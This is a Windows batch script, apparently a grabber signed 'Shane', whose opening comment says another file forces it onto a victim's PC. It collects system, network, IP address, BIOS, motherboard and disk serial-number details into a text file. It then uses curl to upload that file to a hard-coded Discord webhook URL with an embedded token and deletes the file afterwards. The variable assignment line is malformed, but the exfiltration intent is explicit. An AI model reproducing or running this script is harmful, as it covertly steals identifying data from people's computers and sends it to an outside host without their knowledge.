#Grabs data other file forces this download onto the pc and goes to my webhook
@echo off
echo Hello! Made by Shane.
:: Collect detailed system information
echo System Information > sysinfo.txt
systeminfo >> sysinfo.txt

:: Network Configuration
echo. >> sysinfo.txt
echo Network Configuration >> sysinfo.txt
ipconfig /all >> sysinfo.txt

:: IPv4 Address
echo. >> sysinfo.txt
echo IPv4 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do echo %%i >> sysinfo.txt

:: IPv6 Address
echo. >> sysinfo.txt
echo IPv6 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv6 Address"') do echo %%i >> sysinfo.txt

:: CPU Information
echo. >> sysinfo.txt
echo CPU Information >> sysinfo.txt
wmic cpu get name,description /value >> sysinfo.txt

:: BIOS Information
echo. >> sysinfo.txt
echo BIOS Information >> sysinfo.txt
wmic bios get name,version,serialnumber /value >> sysinfo.txt

:: GPU Information
echo. >> sysinfo.txt
echo GPU Information >> sysinfo.txt
wmic path win32_videocontroller get name,adapterram /value >> sysinfo.txt

:: Motherboard Information
echo. >> sysinfo.txt
echo Motherboard Information >> sysinfo.txt
wmic baseboard get product,manufacturer,serialnumber,version /value >> sysinfo.txt

:: Disk Drives
echo. >> sysinfo.txt
echo Disk Drives >> sysinfo.txt
wmic diskdrive get model,size /value >> sysinfo.txt

:: Memory Information
echo. >> sysinfo.txt
echo Memory Information >> sysinfo.txt
wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt

:: Set webhook URL
set "https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"

:: Use curl to send the file with --ssl-no-revoke flag
curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%

:: Clean up
del sysinfo.txt

pause
